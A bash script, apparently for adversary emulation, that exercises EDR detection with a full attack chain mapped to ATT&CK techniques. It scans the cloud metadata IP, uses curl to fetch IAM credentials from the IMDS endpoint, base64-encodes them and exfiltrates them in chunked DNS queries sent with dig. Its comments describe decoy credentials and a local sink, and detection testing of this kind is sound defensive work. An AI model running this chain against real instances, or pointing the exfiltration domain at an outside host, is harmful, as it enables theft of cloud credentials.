#!/bin/bash
#
# run-metadata-exfil.sh
# ---------------------------------------------------------------------------
# EDR DETECTION COVERAGE — NON-PRODUCTION USE ONLY
#
# Emulates the adversary behaviour chain below so that EDR / telemetry can be
# validated against it. Everything is self-contained: the metadata endpoint
# serves DECOY credentials and the DNS "exfil" goes to a local sink on the
# environment's network. No real credentials exist and nothing leaves the environment.
#
#   1. Discovery      nmap scan of the link-local metadata IP   (T1046 / T1595)
#   2. Credential acc. curl the IMDS IAM credentials endpoint   (T1552.005)
#   3. Collection     base64-encode the retrieved blob          (T1140 / staging)
#   4. Exfiltration   send the b64 as DNS subdomain queries     (T1048.003 / T1071.004)
#
# The run is intentionally NOISY to generate alerts. Each step prints the
# ATT&CK technique it maps to.
# ---------------------------------------------------------------------------
set -u

METADATA_IP="${METADATA_IP:-169.254.169.254}"
EXFIL_DOMAIN="${EXFIL_DOMAIN:-exfil.internal}"
DNS_SINK="${DNS_SINK:-dns-sink}"          # hostname or IP of the environment's DNS sink
RESULTS_DIR="${RESULTS_DIR:-/home/root/results}"
SESSION="$(date +%s)"
LOG="${RESULTS_DIR}/run_${SESSION}.log"

mkdir -p "$RESULTS_DIR"

say() { echo -e "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG"; }
step() { echo "" | tee -a "$LOG"; say "=== $* ==="; }

resolve_sink() {
    # Resolve the sink hostname to an IP for dig's @server argument.
    # (a pipeline's status is awk's, so test the captured output, not ||)
    local ip
    ip="$(getent hosts "$DNS_SINK" 2>/dev/null | awk '{print $1; exit}')"
    [ -n "$ip" ] || { echo "[metadata-exfil] !! cannot resolve DNS sink '$DNS_SINK'" >&2; return 1; }
    echo "$ip"
}

say "Northline :: metadata-theft + DNS-exfil emulation :: session=$SESSION"
say "metadata=$METADATA_IP exfil-domain=$EXFIL_DOMAIN dns-sink=$DNS_SINK"

# --- Step 1: Discovery -----------------------------------------------------
step "Step 1: Discovery — nmap scan of metadata IP (ATT&CK T1046)"
nmap -Pn -n -p 80,443,8080 --reason "$METADATA_IP" 2>&1 | tee -a "$LOG"

# --- Step 2: Credential access --------------------------------------------
step "Step 2: Credential access — query IMDS (ATT&CK T1552.005)"
ROLE_URL="http://${METADATA_IP}/latest/meta-data/iam/security-credentials"
ROLE="$(curl -s --max-time 5 "$ROLE_URL/" | head -n1)"
say "discovered IAM role (decoy): ${ROLE:-<none>}"
RAW="${RESULTS_DIR}/creds_${SESSION}.json"
curl -s --max-time 5 "${ROLE_URL}/${ROLE}" -o "$RAW"
say "retrieved decoy credential blob -> $RAW ($(wc -c < "$RAW" 2>/dev/null || echo 0) bytes)"

if [ ! -s "$RAW" ]; then
    say "!! no data from metadata endpoint — is metadata_api running on $METADATA_IP? aborting."
    exit 1
fi

# --- Step 3: Collection / staging -----------------------------------------
step "Step 3: Collection — base64-encode the blob (ATT&CK T1560.001)"
B64="$(base64 -w0 "$RAW" | tr '+/' '-_' | tr -d '=')"   # url-safe, DNS-label friendly
say "encoded payload length: ${#B64} chars"

# --- Step 4: Exfiltration over DNS ----------------------------------------
step "Step 4: Exfiltration — DNS tunnel to sink (ATT&CK T1048.003)"
SINK_IP="$(resolve_sink)" || { say "!! cannot resolve DNS sink $DNS_SINK — is dns-sink running? aborting."; exit 1; }
say "using DNS sink @ $SINK_IP"
# DNS labels max 63 chars; keep well under and split into one label per query.
CHUNK=48
seq=0
for ((i=0; i<${#B64}; i+=CHUNK)); do
    label="${B64:i:CHUNK}"
    qname="${seq}.${SESSION}.${label}.${EXFIL_DOMAIN}"
    dig +short +tries=1 +time=2 @"$SINK_IP" "$qname" A >/dev/null 2>&1 \
        && say "  exfil seq=$seq ($label)" \
        || say "  exfil seq=$seq FAILED ($qname)"
    seq=$((seq+1))
done

step "Done — ${seq} DNS exfil queries sent. Review EDR/alerting telemetry."
say "artifacts: $LOG  $RAW  (decoded copy appears in sink's results as exfil_${SESSION}.decoded)"
